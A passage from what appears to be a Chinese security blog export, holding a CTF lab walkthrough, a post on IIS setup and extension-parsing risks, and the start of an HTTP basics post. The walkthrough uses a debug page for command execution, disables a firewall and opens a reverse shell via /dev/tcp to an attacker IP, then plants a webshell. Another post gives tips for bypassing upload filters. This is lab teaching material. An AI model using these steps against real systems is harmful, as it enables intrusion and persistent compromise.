<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.1.107:8080</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;扫出了个<code>/test.jsp</code></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1627714481394-793cd585-281c-4c0c-a0dd-100686418c23.png" alt="img"></p>
<h3 id="（2）nikto"><a href="#（2）nikto" class="headerlink" title="（2）nikto"></a>（2）nikto</h3><p>&emsp;&emsp;使用nikto探测，发现test.jsp可能比较因缺思厅，那么就让我康康！</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638888727790-756708be-5ddd-416a-a8d4-ab60f463f87e.png" alt="img"></p>
<h1 id="四、漏洞探测与利用"><a href="#四、漏洞探测与利用" class="headerlink" title="四、漏洞探测与利用"></a>四、漏洞探测与利用</h1><h2 id="1、漏洞探测——命令执行"><a href="#1、漏洞探测——命令执行" class="headerlink" title="1、漏洞探测——命令执行"></a>1、漏洞探测——命令执行</h2><p>&emsp;&emsp;访问：<code>http://192.168.1.107:8080/test.jsp</code>，出现以下页面，这是一个调试页面，可以用来命令执行</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638888844966-6ad86d97-315e-493b-a328-a179d0dc9bf1.png" alt="img"></p>
<h2 id="2、信息收集"><a href="#2、信息收集" class="headerlink" title="2、信息收集"></a>2、信息收集</h2><p>&emsp;&emsp;查看临时缓冲目录，没什么有用的信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls -alh /tmp/</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638890755332-793e01fb-8db4-45e0-9407-5a6a313b1d98.png" alt="img"></p>
<p>&emsp;&emsp;查看home目录，挖掘用户信息，发现了bill</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls -la /home</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638888879666-caeef8fc-7376-4eeb-b998-f2dff92a7e57.png" alt="img"></p>
<p>&emsp;&emsp;查看具体用户bill的目录，我们可以看到具有ssh服务，后续可以使用sudo来拿到root</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls /home/bill -lah</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638890826401-c5969405-0a1d-4bf2-9786-41da55dd1b9a.png" alt="img"></p>
<p>&emsp;&emsp;查看系统信息，为ubuntu系统</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638891176526-0aa76660-1b06-4f13-b9b7-0255c9e0477f.png" alt="img"></p>
<p>&emsp;&emsp;查看用户bill在主机上可以使用和禁止的命令，没什么有用的信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh bill@localhost sudo -l</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638888929543-acec2a55-46c0-42b9-bef4-49a8f82da9b0.png" alt="img"></p>
<h2 id="3、反弹shell"><a href="#3、反弹shell" class="headerlink" title="3、反弹shell"></a>3、反弹shell</h2><p>&emsp;&emsp;关闭防火墙，没有消息就是好消息，关闭防火墙成功</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh bill@localhost sudo ufw <span class="built_in">disable</span></span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638890317314-9933a34f-e2ad-4fdf-9a6f-95632003b44d.png" alt="img"></p>
<p>&emsp;&emsp;kali打开nc监听某个端口，这里我设置为4444</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638889015592-7186314f-5027-4ef9-a7df-20a3cf07290f.png" alt="img"></p>
<p>&emsp;&emsp;反弹shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh bill@localhost sudo bash -i &gt;&amp; /dev/tcp/攻击者IP/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638890413880-fad8ef90-a6dd-4925-92ba-b0275464e792.png" alt="img"></p>
<p><strong>【插播：渗透测试技巧】</strong></p>
<p>&emsp;&emsp;开启python简易http服务器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;利用命令执行下载木马文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh bill@localhost sudo wget “http://ip:port/shell.jsp” -O /var /lib/tomcat8/webapps/ROOT/shell.jsp</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;拿到flag</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638890458865-543de0aa-dfe5-4431-b232-17b986961b35.png" alt="img"></p>
<h1 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h1><p>&emsp;&emsp;在CTF比赛中，命令执行漏洞具有很多过滤机制。对于开放ssh服务的靶场机器，可以采取以上方法进行渗透靶场机器。如果没有开放ssh服务，则需要利用绕过过滤技巧来达到命令执行的目的。</p>
]]></content>
      <categories>
        <category>综合靶场</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>提权</tag>
        <tag>SSH</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>Web搭建安全拓展</title>
    <url>/post/ec694927.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、常见搭建平台脚本启用"><a href="#一、常见搭建平台脚本启用" class="headerlink" title="一、常见搭建平台脚本启用"></a>一、常见搭建平台脚本启用</h1><p>&emsp;&emsp;ASP，PHP，ASPX，JSP，PY，JAVAWEB等环境</p>
<h1 id="二、域名IP目录解析安全问题"><a href="#二、域名IP目录解析安全问题" class="headerlink" title="二、域名IP目录解析安全问题"></a>二、域名IP目录解析安全问题</h1><h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>&emsp;&emsp;IP地址访问可以发现更多的信息同时经常能找到程序源码备份文件和敏感信息，而域名访问只能发现一个文件夹下的所有文件。</p>
<p>&emsp;&emsp;网站搭建的时候支持IP访问和域名访问，域名访问的时候一般只会指向某个目录，IP访问的时候指向的是根目录。</p>
<h2 id="2、实验分析"><a href="#2、实验分析" class="headerlink" title="2、实验分析"></a>2、实验分析</h2><h3 id="（1）实验环境搭建"><a href="#（1）实验环境搭建" class="headerlink" title="（1）实验环境搭建"></a>（1）实验环境搭建</h3><p>&emsp;&emsp;在根目录下创建一个index.html</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630683782688-d8e3b583-1430-42ff-8a84-85cbf0533f92.png" alt="img"></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span>这是<span class="tag">&lt;<span class="name">strong</span>&gt;</span>根目录<span class="tag">&lt;/<span class="name">strong</span>&gt;</span>下的网页<span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;在根目录下创建一个名为wnd的文件夹，里面写一个index.html</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630683525952-24230f93-5dc0-48ad-a54e-cff4abf6ab88.png" alt="img"></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span>这是<span class="tag">&lt;<span class="name">strong</span>&gt;</span>wnd目录<span class="tag">&lt;/<span class="name">strong</span>&gt;</span>下的网页<span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;将域名wnd198.com绑定到wnd文件夹</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630683481862-19e93d5e-5b7a-49cb-89f8-32d1cd7f4dd6.png" alt="img"></p>
<p>&emsp;&emsp;利用<code>ipconfig</code>查看到本机IP为192.168.1.104，修改hosts文件，增加一条解析</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630684193463-6f1f318e-9e51-4f50-9a69-b9811dea2b1b.png" alt="img"></p>
<h3 id="（2）验证和结果分析"><a href="#（2）验证和结果分析" class="headerlink" title="（2）验证和结果分析"></a>（2）验证和结果分析</h3><p>&emsp;&emsp;访问<code>wnd198.com</code>，访问的是wnd目录下的文件</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630684388646-bbe73dc5-2341-413f-bae7-d1e2e5a307b8.png" alt="img"></p>
<p>&emsp;&emsp;直接访问IP地址192.168.1.104，访问的是根目录的文件</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630684482393-bae0eaa8-64fb-4c40-8e26-10fe78823d56.png" alt="img"></p>
<h1 id="三、部署IIS"><a href="#三、部署IIS" class="headerlink" title="三、部署IIS"></a>三、部署IIS</h1><h2 id="1、安装IIS"><a href="#1、安装IIS" class="headerlink" title="1、安装IIS"></a>1、安装IIS</h2><p>&emsp;&emsp;安装IIS之web插件，插入光盘–找到IIS–WEB(应用程序服务器–Internet信息服务）</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630679597916-bca44dff-2edf-4e15-85d2-50c69fb60953.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630679631430-aca28da8-36e3-4977-b1d5-21f2c726a7c0.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630679713520-4accfcdc-5a23-4561-aed6-1b6a7c944948.png" alt="img"><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630679733051-dd7083f3-bdcb-4e1b-86d9-2df3e85b1562.png" alt="img"></p>
<p>&emsp;&emsp;出现这种情况把D改成E即可。因为之前我安装虚拟机的时候强制把D盘符给了硬盘，把光盘设置为E盘，所以按安装程序还以为光盘在D盘所以找不到文件因此冒出提示</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630680409256-f0ef8643-9a02-4805-a983-d29edee922c0.png" alt="img"></p>
<p>&emsp;&emsp;安装完成，可以在这里看到</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630680562162-ecc3e018-7a1a-4c91-bb78-ff2a28a48ce7.png" alt="img"></p>
<h2 id="2、验证安装情况"><a href="#2、验证安装情况" class="headerlink" title="2、验证安装情况"></a>2、验证安装情况</h2><p>&emsp;&emsp;安装完毕，使用<code>netstat -an</code>验证TCP/80端口是否打开！此时80已经打开，且IIS自带了一个发布好的网站，称之为默认网站！</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630680752200-08b217d0-a15b-46c1-a225-c2878155eddf.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630680927345-417ab75f-3372-442d-b547-3980773fa395.png" alt="img"></p>
<p>&emsp;&emsp;IIS自带的默认网站路径：<strong>c:\Inetpub\wwwroot</strong>。此时建议停止默认网站！</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630681004416-eb7df5b5-a0ab-448d-bfa3-10f16aa55688.png" alt="img"></p>
<p>&emsp;&emsp;停止默认网站后，可以发现TCP 80端口号也不见了，因此可以知道80端口号开放了那么web服务器一定有一个以上的网站。用xp再次访问10.1.1.1，显示如下错误，这是因为最后一个网站都停用了，那TCP 80端口号就关闭了</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630681113705-e1ec0a24-7ac8-44a8-978a-47a52b1a41c1.png" alt="img"><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630681136908-a3c7c546-1429-4e0d-95e6-7e36ae6e4228.png" alt="img"></p>
<h2 id="3、新建网站"><a href="#3、新建网站" class="headerlink" title="3、新建网站"></a>3、新建网站</h2><p>&emsp;&emsp;新建一个flower的网站，并在网站目录下新建一个index.html文件并将该html在文档一栏中设置为默认文档</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#index.html源码</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span>Welcome to my flowers store<span class="tag">&lt;/<span class="name">strong</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630686278069-2de13101-a8bd-4396-929c-57c7984d3124.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631077671743-9e074b2b-dcdd-456d-a7a4-6f91f80f0661.png" alt="img"></p>
<p>&emsp;&emsp;访问成功</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631077781146-d82852c4-f925-479c-a83a-d894208c570c.png" alt="img"></p>
<h1 id="四、常见文件后缀解析对应安全"><a href="#四、常见文件后缀解析对应安全" class="headerlink" title="四、常见文件后缀解析对应安全"></a>四、常见文件后缀解析对应安全</h1><p>&emsp;&emsp;指定后缀名对应某个文件，访问网站出现遇到不能解析的文件就是中间件可能默认或者添加某些设置导致解析时出现问题。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631077557389-1e024f1d-5de7-4c33-8b86-2749df38aeae.png" alt="img"></p>
<h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><h3 id="（1）实验准备"><a href="#（1）实验准备" class="headerlink" title="（1）实验准备"></a>（1）实验准备</h3><p>&emsp;&emsp;从网站上随便找了个asp网站源码，先按照使用手册的要求进行相关设置</p>
<p>&emsp;&emsp;对网站根目录下的Nzcms_nzweb文件夹添加everyone用户，写入权限</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631079397353-91f7cc67-90d2-4138-8476-ad8d5397f590.png" alt="img"></p>
<p>&emsp;&emsp;开通IIS父路径</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631079579444-b6e9ccb0-59c7-4ee0-9704-a9c551b842c2.png" alt="img"></p>
<p>&emsp;&emsp;IIS设置执行权限（纯脚本） </p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631079660474-9ac58478-efe9-406e-a11e-946796eea766.png" alt="img"></p>
<p>&emsp;&emsp;如果执行权限为无，那么当访问<code>http://本机IP/nz0808/index.asp</code>，发现错误，报错信息为无法运行脚本，说明没有运行的权限</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631078672193-6f546557-4605-444a-845d-394a4f14f71b.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631078575537-1bd33227-0626-4f5d-bd8e-4f703413efb8.png" alt="img"></p>
<p>&emsp;&emsp;添加index.asp文档名称</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631079751744-5066f25c-06dc-495a-ac9e-338d95f2bda6.png" alt="img"></p>
<p>&emsp;&emsp;IIS里的WEB服务器扩展设置</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631079814652-67f9475b-4a48-4451-a734-8b4ce985265b.png" alt="img"></p>
<p>&emsp;&emsp;访问成功</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631079973928-8f4489b2-ca0e-4103-a1cf-6ae69e253f8d.png" alt="img"></p>
<h3 id="（2）进行实验"><a href="#（2）进行实验" class="headerlink" title="（2）进行实验"></a>（2）进行实验</h3><p>&emsp;&emsp;当我们访问：<code>http://192.168.43.77/index.asp</code>时，正常成功访问</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631080101192-6920a682-320d-4309-aeaf-b9d7a77d58c9.png" alt="img"></p>
<p>&emsp;&emsp;当我们访问：<code>http://192.168.43.77/index.haha123</code>时，找不到网页，正常，因为网站根本没有这个文件</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631080131950-d7eb85a0-f4d9-4462-a118-7b32431aef25.png" alt="img"></p>
<p>&emsp;&emsp;将index.asp重命名为index.haha123后，再次访问<code>http://192.168.43.77/index.haha123</code>，还是不行，因为无法解析后缀名为haha123的文件</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631080911556-db7b4f14-9bc9-408d-a3f5-8b30b911d239.png" alt="img"></p>
<p>&emsp;&emsp;添加一个haha123的文件后缀解析规则，将haha123后缀解析为asp</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631080786865-53251af1-a424-47ed-a984-a8f1a499b471.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631080384718-da3ffe3e-b1ad-4745-8034-11d538adc3b2.png" alt="img"></p>
<p>&emsp;&emsp;再次访问：<code>http://192.168.43.77/index.haha123</code>时，成功解析打开</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631080851217-21fffd33-cd39-4a08-b0ff-4c7deb2b2bb9.png" alt="img"></p>
<h3 id="（3）实验总结"><a href="#（3）实验总结" class="headerlink" title="（3）实验总结"></a>（3）实验总结</h3><p>&emsp;&emsp;在实验准备的过程中，有一步是增加了Everyone用户并对其进行权限设置，在很多时候比如用菜刀连接一句话木马的时候，会发现只看的到当前网站目录访问不到别的目录；或者是只能看文件但是不能修改文件；这些都可能是设置了目录的用户权限</p>
<p>&emsp;&emsp;在实验准备的过程中，有一步是设置执行权限为纯脚本，假如为无那么将运行不了脚本文件，因此有的时候即使上传了一句话木马但是发现连接不上很可能是因为执行权限不够。但是一般情况下，考虑到网站运行，都会允许脚本运行</p>
<p>&emsp;&emsp;在实验时发现，只要解析规则上有，就可以解析相关的后缀文件。因此假如一句话木马不允许上传PHP文件，但是解析规则又能解析php3为php文件，那么可以上传php3后缀的木马文件进行绕过。</p>
<h1 id="五、常见安全测试中的安全防护"><a href="#五、常见安全测试中的安全防护" class="headerlink" title="五、常见安全测试中的安全防护"></a>五、常见安全测试中的安全防护</h1><ol>
<li>企业内网会限制外部人员访问内部的网站，限制IP地址，规范访问者的权限</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626008822063-6c337fcc-d3cf-4ad4-bbd5-47df888eba58.png" alt="img"></p>
<ol start="2">
<li>身份验证和访问控制，基于用户的限制</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626008830641-b5f6558a-e62a-41ca-ae1a-28f14dfdb62e.png" alt="img"></p>
<ol start="3">
<li>限制IP地址的访问，授权访问-只允许指定IP地址可以访问。 拒绝访问-指定IP地址拒绝访问</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626008840558-1fe89da7-f7f2-49cd-9cd1-a36a2b0b749f.png" alt="img"></p>
<h1 id="六、Web目录中敏感文件"><a href="#六、Web目录中敏感文件" class="headerlink" title="六、Web目录中敏感文件"></a>六、Web目录中敏感文件</h1><ol>
<li><p>后台路径</p>
</li>
<li><p>配置文件</p>
</li>
<li><p>备份文件</p>
</li>
</ol>
<h1 id="七、Web后门与用户及文件权限"><a href="#七、Web后门与用户及文件权限" class="headerlink" title="七、Web后门与用户及文件权限"></a>七、Web后门与用户及文件权限</h1><ol>
<li>设置相关权限，禁止来宾用户的权限，导致连接的后门看不到任何东西，它属于防护技巧，同时也是测试里经常碰到的问题</li>
<li>设置了执行权限，没有执行权限，文件不给执行，代码就无法正常执行，后门就无法正常使用</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626008876621-456f9a3a-3ba5-49ee-956d-a97b05f984a9.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626008902225-3d083773-6e85-4a80-9d10-3e6ab5bfcccf.png" alt="img"></p>
<ol start="3">
<li><p>绕过思路：</p>
</li>
<li><p>a. 将后门试着放在其他可以执行的目录。比如，网站根目录或者其他有脚本存放的目录下面</p>
</li>
</ol>
<h1 id="八、基于中间件的简要识别"><a href="#八、基于中间件的简要识别" class="headerlink" title="八、基于中间件的简要识别"></a>八、基于中间件的简要识别</h1><p>&emsp;&emsp;通过抓取数据包的返回结果，查询搭建平台信息</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631081913201-6966ab37-b31a-4e0d-97d5-9ad792c56ec6.png" alt="img"></p>
<h1 id="九、基于中间件的安全漏洞"><a href="#九、基于中间件的安全漏洞" class="headerlink" title="九、基于中间件的安全漏洞"></a>九、基于中间件的安全漏洞</h1><p>&emsp;&emsp;<a href="https://www.freebuf.com/articles/web/192063.html">https://www.freebuf.com/articles/web/192063.html</a></p>
<p>&emsp;&emsp;<a href="https://www.yuque.com/attachments/yuque/0/2021/pdf/2893488/1631082172781-1c4b0d7e-b1bb-4599-b4d1-e4a86a7a97f1.pdf">web中间件常见漏洞总结.pdf</a></p>
<h1 id="十、搭建Vulhub靶场"><a href="#十、搭建Vulhub靶场" class="headerlink" title="十、搭建Vulhub靶场"></a>十、搭建Vulhub靶场</h1><h2 id="1、下载"><a href="#1、下载" class="headerlink" title="1、下载"></a>1、下载</h2><p>&emsp;&emsp;Vulhub官网：<a href="https://vulhub.org/vulhub">https://vulhub.org/vulhub</a></p>
<h2 id="2、安装"><a href="#2、安装" class="headerlink" title="2、安装"></a>2、安装</h2><ol>
<li>官方推荐用Ubuntu来安装</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631416690983-99b4b6ce-8c30-4546-9c4c-5b7b6d532e92.png" alt="img"></p>
<ol start="2">
<li>安装常用软件：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt是Ubuntu的一个更新源</span><br><span class="line">apt-get update:更新软件列表</span><br><span class="line">apt-get install:安装命令</span><br><span class="line">apt-get install ssh：安装ssh服务</span><br><span class="line">apt-get install vim：安装vim编辑器</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631416917773-f2e41770-c185-4a02-9c32-334cc2931fe8.png" alt="img"></p>
<ol start="3">
<li>开启ssh服务（查看状态已经开启过了）：<code>systemctl status ssh</code> 或者 <code>service ssh status</code></li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631417044185-6b4ebfb6-d075-490e-b296-ccceb7986551.png" alt="img"></p>
<ol start="4">
<li><p>安装curl：<code>sudo apt-get install curl</code></p>
</li>
<li><p>安装Docker：<code>curl -s https://get.docker.com/ | sh</code></p>
</li>
<li><p>查看docker是否安装成功：<code>docker -v</code></p>
</li>
<li><p>安装docker-compose（没有pip命令先安装Python：<code>apt-get install python3-pip</code>）<br>命令：<code>pip install docker-compose</code></p>
</li>
<li><p>检查是否安装成功：<code>docker-compose -v</code></p>
</li>
<li><p>下载Vulhub（不能执行Git命令的先安装Git，命令：<code>apt-get install git</code>）<br>命令：<code>git clone https://github.com/vulhub/vulhub.git</code></p>
</li>
<li><p>将下载好的vulhub移至local文件夹：<code>mv vulhub /usr/local</code></p>
</li>
<li><p>安装成功，进入目录</p>
</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631418453888-3163fec5-a7c7-45a3-b65e-b6fd5258afb6.png" alt="img"></p>
<h2 id="3、启动环境"><a href="#3、启动环境" class="headerlink" title="3、启动环境"></a>3、启动环境</h2><ol>
<li>进入漏洞环境目录：<code>cd tomcat/tomcat8/</code></li>
<li>执行命令：<br><code>docker-compose build</code><br><code>docker-compose up -d</code>   </li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631419409253-31a4ba17-0535-4129-965b-80d6d6305104.png" alt="img"></p>
<ol start="3">
<li>安装完成</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631419623872-a46e8312-7c26-4540-9ef1-9682c0c4487e.png" alt="img"></p>
<ol start="4">
<li>打开官网，根据官方文档来操作</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631419543235-4953f1c4-ee63-4ef7-b5bf-d2ac5dd280d3.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631419722240-d408ed6d-da4b-4c9c-88c4-047e82762c36.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631419731555-8c7da4fa-9614-4156-a278-11e173c16498.png" alt="img"></p>
<ol start="5">
<li><p>复现之后即可关闭：<code>docker-compose down</code></p>
</li>
<li><p>完成</p>
</li>
</ol>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631419756533-734560fb-03d0-4ec0-8607-99ca14a932c1.png" alt="img"></p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Web数据包拓展</title>
    <url>/post/488cc6a6.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、网站解析对应"><a href="#一、网站解析对应" class="headerlink" title="一、网站解析对应"></a>一、网站解析对应</h1><p>&emsp;&emsp;涉及到的攻击层面？（源码，搭建平台，系统，网络层等） </p>
<p>&emsp;&emsp;涉及到的安全问题？（目录，敏感文件，弱口令，IP 及域名等）  </p>
<h1 id="二、HTTP-HTTPS数据包"><a href="#二、HTTP-HTTPS数据包" class="headerlink" title="二、HTTP/HTTPS数据包"></a>二、HTTP/HTTPS数据包</h1><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630581800265-8a77b9ec-0619-4cec-914d-705eaad8f74e.png" alt="image.png"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630582307082-e666f24e-a7ac-4d99-b3df-abdaa21068c7.png" alt="image.png"></p>
<h1 id="三、HTTP-HTTPS具体区别"><a href="#三、HTTP-HTTPS具体区别" class="headerlink" title="三、HTTP/HTTPS具体区别"></a>三、HTTP/HTTPS具体区别</h1><h2 id="3-1-HTTP简要通信过程"><a href="#3-1-HTTP简要通信过程" class="headerlink" title="3.1 HTTP简要通信过程"></a>3.1 HTTP简要通信过程</h2><p>&emsp;&emsp;建立连接–&gt;发送请求数据包–&gt;返回相应数据包–&gt;关闭连接</p>
<ol>
<li>浏览器建立与Web服务器之间的连接</li>
<li>浏览器将请求数据打包（生成请求数据包）并发送到Web服务器</li>
<li>Web服务器将处理结果打包（生成相应数据包）并发送给浏览器</li>
<li>Web服务器关闭连接</li>
</ol>
<h2 id="3-2-HTTPS简要通信过程（见图）"><a href="#3-2-HTTPS简要通信过程（见图）" class="headerlink" title="3.2 HTTPS简要通信过程（见图）"></a>3.2 HTTPS简要通信过程（见图）</h2><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630582387031-e39f1241-1f9b-4aaf-9c68-e07123f7b7a7.png" alt="image.png"></p>
<h1 id="四、Request请求数据包数据格式"><a href="#四、Request请求数据包数据格式" class="headerlink" title="四、Request请求数据包数据格式"></a>四、Request请求数据包数据格式</h1><ul>
<li><p>请求行：请求类型/请求资源路径、版本的协议和类型</p>
</li>
<li><p>请求头：一些键值对，浏览器与Web服务器之间都可以发送，特定的某种含义</p>
</li>
<li><p>空行：请求头与请求体之间用一个空行隔开</p>
</li>
<li><p>请求体：要发送的数据（一般POST提交会使用）；例：user=123&amp;pas=123</p>
</li>
</ul>
<p>例：</p>
